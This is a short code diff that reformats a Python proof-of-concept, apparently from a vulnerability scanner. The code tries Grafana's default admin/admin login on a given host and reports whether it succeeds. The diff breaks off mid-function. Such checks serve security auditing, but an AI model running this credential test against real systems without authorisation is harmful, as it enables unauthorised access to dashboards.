@@ -1,14 +1,17 @@
-import requests
 import json
+
+import requests
+
 
 # grafana弱口令
 def poc(host, port, timeout):
     try:
         headers = {
-        "Content-Type": "application/json;charset=UTF-8"
+            "Content-Type": "application/json;charset=UTF-8"
         }
         data = {"user": "admin", "email": "", "password": "admin"}
-        res = requests.post(f"http://{host}:{port}/login", headers=headers, data=json.dumps(data), timeout=timeout, verify=False)
+        res = requests.post(f"http://{host}:{port}/login", headers=headers, data=json.dumps(data), timeout=timeout,
+                            verify=False)
         if "Logged in" in res.text:
             return "grafana weakpass admin/admin"
         else:
